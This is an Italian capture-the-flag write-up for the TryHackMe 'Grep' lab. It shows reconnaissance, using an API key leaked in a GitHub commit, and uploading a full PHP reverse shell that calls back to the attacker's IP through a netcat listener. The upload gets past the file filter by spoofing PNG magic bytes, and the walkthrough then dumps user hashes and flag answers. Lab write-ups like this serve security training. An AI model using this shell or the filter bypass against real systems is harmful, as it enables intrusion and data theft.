#tryhackmelabs #laboratorio 

https://tryhackme.com/room/greprtp

Benvenuti alla sfida OSINT , parte del percorso Red Teaming di TryHackMe. In questa sfida, vestirete i panni di un hacker etico che mira a sfruttare una nuova applicazione web.

SuperSecure Corp, una startup in rapida crescita, sta attualmente creando una piattaforma di blogging che invita i professionisti della sicurezza a valutarne la sicurezza. La sfida prevede l'utilizzo di tecniche OSINT per raccogliere informazioni da fonti accessibili al pubblico e sfruttare potenziali vulnerabilità nell'applicazione web.

Per iniziare, distribuisci la macchina.  Fai clic sul  `Start Machine` pulsante nell'angolo in alto a destra di questa attività per distribuire la macchina virtuale per questa stanza.

Il tuo obiettivo è identificare e sfruttare le vulnerabilità dell'applicazione utilizzando una combinazione di competenze di ricognizione e OSINT . Man mano che avanzerai, cercherai punti deboli nell'app, reperirai dati sensibili e tenterai di ottenere accessi non autorizzati. Sfrutterai le competenze e le conoscenze acquisite attraverso il Red Team Pathway per ideare ed eseguire le tue strategie di attacco.

**Nota:** attendere 3-5 minuti per l'avvio completo del computer. Inoltre, non è necessaria alcuna escalazione locale dei privilegi per rispondere alle domande.

```
nmap -Pn -O -v -p- 10.10.18.205 
```
vediamo cosa troviamo scansionando IP con nmap
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
51337/tcp open  unknown
Device type: general purpose

```

```
nmap -sVC -v -p22,80,443,51337 10.10.18.205 
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:f4:b5:37:de:7b:d1:a2:9b:ac:0b:db:ad:30:44:87 (RSA)
|   256 8b:a2:f0:20:af:60:08:f6:fd:db:d4:fb:03:1d:f9:1e (ECDSA)
|_  256 ad:f4:85:88:da:29:dc:a4:32:66:c6:d8:36:d2:55:68 (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp   open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Issuer: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-14T13:03:09
| Not valid after:  2024-06-13T13:03:09
| MD5:   7295:8ef0:7c16:221c:3b0a:40ee:913c:766c
|_SHA-1: 38c2:3ba3:34b1:851a:f1d4:ee0a:37bd:701a:830c:7dd8
51337/tcp open  http     Apache httpd 2.4.41
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: Host: ip-10-10-18-205.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

ci colleghiamo a 
```
https://10.10.18.205:51337/
```
non visualizziamo la pagina, visualizziamo il certificato
troviamo utile
```
leakchecker.grep.thm
```

aggiungiamolo al file hosts il dominio ed il sottodominio

```
nano /etc/hosts
```

```
10.10.18.205    grep.thm leakchecker.grep.thm
```

ora ci ricolleghiamo a 
```
https://leakchecker.grep.thm:51337/
```
dove abbiamo una pagina dove immettere una mail leak 
```
## Email Leak Checker

Email:
```

andiamo avanti

ci colleghiamo a
```
https://grep.thm/public/html/
```
troviamo la pagina di registrazione
```
https://grep.thm/public/html/register.php
```
se proviamo a registrarci otteniamo un errore
```
Invalid or Expired API key
```

facciamo una ricerca su SearchME (nome della pagina web)

troviamo su GitHub nella history della repo
```
https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6
```
la chiave api
```

|`   if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {   `|

|   |
|---|
|`   if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {   `|

```

Qual è la chiave API che consente a un utente di registrarsi sul sito web?
```
ffe60ecaa8bba2f12b43d1a4b15b8f39
```

ora che abbiamo la chiave possiamo Registrarci utilizzando Burp Suite pe r modificarla

catturiamo la richiesta ed inviamola al repeater
```
POST /api/register.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=9v7l6dj0vptjkrb40hv984c96s
User-Agent: J
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://grep.thm/public/html/register.php
Content-Type: application/json
X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85
Content-Length: 73
Origin: https://grep.thm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"dam","password":"123456","email":"dam@dam.com","name":"dam"}
```
sostituiamo l'Api key
```
POST /api/register.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=9v7l6dj0vptjkrb40hv984c96s
User-Agent: J
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://grep.thm/public/html/register.php
Content-Type: application/json
X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39
Content-Length: 73
Origin: https://grep.thm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"dam","password":"123456","email":"dam@dam.com","name":"dam"}
```
inviamo la richiesta ed otteniamo come risposta
```
HTTP/1.1 200 OK
Date: Sat, 19 Jul 2025 11:52:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 38
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"message":"Registration successful."}
```

ora possiamo loggarci ed ottenere la nostra flag!
```
## Welcome, dam!

### First Flag

THM{4ec9806d7e1350270dc402ba870ccebb}

---

### First Test Post

This is a test post from the admin

---

### Second Test Post

This is a test post from the admin

---

### Test

Test
```
Qual è la prima bandiera?
```
THM{4ec9806d7e1350270dc402ba870ccebb}
```

Precedentemente su GitHub abbiamo notato l'esistenza di un file upload.php
proviamo a vedere se esiste

```
https://grep.thm/public/html/upload.php
```
si c'è una sezione dove possiamo uplodare i file

proviamo a caricare una reverse shell

```
nano revshell.php
```

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.99.134';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

otteniamo un errore
```
{"error":"Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed."}
```
ispezioniamo il codice della pagina per capire l'entità del filtro

La convalida del tipo di file è **Magic Bytes**

possiamo provare ad eludere il filtro 

Facciamo un rapido sguardo all'elenco delle [firme dei file su Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) ci mostra che ci sono diversi possibili numeri magici di file png. Scegliamo ( `89 50 4E 47`). 

Prima di iniziare, utilizziamo il comando Linux `file` per verificare il tipo di file della nostra shell:

```
file revshell.php
```
```
└─# file revshell.php                                                     
revshell.php: PHP script, ASCII text
```
Come previsto, il comando ci dice che il tipo di file è PHP . Tenetelo a mente mentre procediamo con la spiegazione.  

Possiamo vedere che il numero magico che abbiamo scelto è lungo quattro byte, quindi apriamo lo script reverse shell e aggiungiamo quattro caratteri casuali sulla prima riga. Questi caratteri non contano, quindi per questo esempio useremo solo quattro "A":

```
nano revshell.php
```
```
AAAA
<?php...........................
```

Salvate il file ed uscite. Ora riapriremo il file in `hexeditor`(che è di default su Kali), o qualsiasi altro strumento che vi permetta di vedere e modificare la shell come esadecimale. In hexeditor il file appare così:

```
hexeditor revshell.php
```
Nota i quattro byte nel riquadro rosso: sono tutti `41`, che è il codice esadecimale per la "A" maiuscola, esattamente ciò che abbiamo aggiunto in precedenza all'inizio del file.

Sostituiscilo con il numero magico che abbiamo trovato in precedenza per i file png:`89 50 4E 47`

```
89 50 4E 47
```

```
00000000  89 50 4E 47  ...................................
```


Ora se salviamo e usciamo dal file (Ctrl + x), possiamo usare `file`ancora una volta e vedere che abbiamo falsificato con successo il tipo di file della nostra shell:
```
file revshell.php
```
```
└─# file revshell.php
revshell.php: Non-ISO extended-ASCII text
```
Perfetto. Ora proviamo a caricare la shell modificata e vediamo se bypassa il filtro!

Ecco fatto: abbiamo aggirato il filtro numerico magico lato server!
ora proviamo ad ottenere una shell inversa.

ci mettiamo in ascolto sulla nostra macchina attaccante
```
nc -lvnp 1234
```

e ci colleghiamo all'indirizzo dove abbiamo caricato il nostro file modificato

```
https://grep.thm/api/uploads/
```

e clicchiamo sul file revshell.png
Otteniamo la nostra revshell!

```
└─# nc -lvnp 1234                
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.18.205] 41650
Linux ip-10-10-18-205 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 13:44:08 up  3:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 

```

dopo aver esplorato tutte le directory troviamo qualcosa in  `/var/www/backup`

```
ls /var/www/backup
```
```
$ ls /var/www/backup
users.sql
$ 
```

proviamo a leggerlo

```
cat /var/www/backup/users.sql
```

```
$ cat /var/www/backup/users.sql
-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 30, 2023 at 01:25 PM
-- Server version: 10.4.28-MariaDB
-- PHP Version: 8.0.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `postman`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `role` varchar(20) DEFAULT 'user'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
$ 
```
abbiamo trovato un hash della password e l'email dell'admin!

Qual è l'email dell'utente "admin"?
```
admin@searchme2023cms.grep.thm
```

Qual è il nome host dell'applicazione web che consente a un utente di controllare un'e-mail per individuare una possibile fuga di password?

è ciò che abbiamo trovato subito all'inizio nel certificato
```
leakchecker.grep.thm
```

Qual è la password dell'utente "admin"?

ci colleghiamo a
```
https://leakchecker.grep.thm:51337/
```
ed immettiamo la mail dell'admin
otteniamo la nostra ultima bandiera!
```
Password: xxxxxxxxxxx
```